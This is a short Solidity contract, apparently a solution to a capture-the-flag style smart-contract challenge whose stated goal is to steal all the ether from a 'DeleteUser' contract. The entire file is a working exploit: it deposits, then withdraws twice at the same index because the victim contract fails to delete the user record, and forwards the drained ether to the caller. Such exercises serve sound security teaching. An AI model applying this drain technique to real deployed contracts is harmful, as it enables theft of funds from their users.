pragma solidity 0.8.15;

import "../DeleteUser.sol";

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
 
contract DeleteUserHack {

    DeleteUser viticmContract;
    function exploit(address _viticm) payable external {

        viticmContract = DeleteUser(_viticm);
         //  Now the user array' s length become 2.
        viticmContract.deposit{value:msg.value}();

        //  Now the user array' s length become 3.
        viticmContract.deposit();

        // the second user  withdraw, but his data not deleted
        viticmContract.withdraw(1);
        (bool result,) = msg.sender.call{value:msg.value}("");
        require(result);

        //The second user can continue withdraw 
        viticmContract.withdraw(1);


        (bool result1,) = msg.sender.call{value:msg.value}("");
        require(result1);

    }

    fallback() payable external{

    }
   
}
 